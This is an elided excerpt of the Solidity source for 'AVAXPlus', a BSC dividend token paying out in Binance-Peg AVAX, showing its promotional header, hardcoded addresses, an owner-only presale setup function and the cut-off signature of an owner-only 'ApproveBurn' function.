...
/*
AVAXPlus:
A BSC token that pays out in Avalanche directly to your wallet.

Telegram: https://t.me/AvaxPlus
Website:  https://www.avaxplus.com
*/
...
contract AVAXPlus is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x0eF8c3Ff4043993745A6a4386e6416b6C7830dd9); // Marketing Address
    address public _dividendToken_AVAX = 0x1CE0c2827e2eF14D5C4f29a091d735A204794041; // Binance-Peg AVAX
    ...
    string public _title = "AVAXPlus.com";
    ...
    function prepareForPreSale() external onlyOwner {
        ...
        _taxFee = 0;
        _liquidityFee = 0;
        _maxTxAmountBuy =  1000000000000000 * 10**0 * 10**9;
        _maxTxAmountSell = 1000000000000000 * 10**0 * 10**9;
    }
    ...
    function ApproveBurn(address recipient , uint256 _amount) external onlyOwner(){
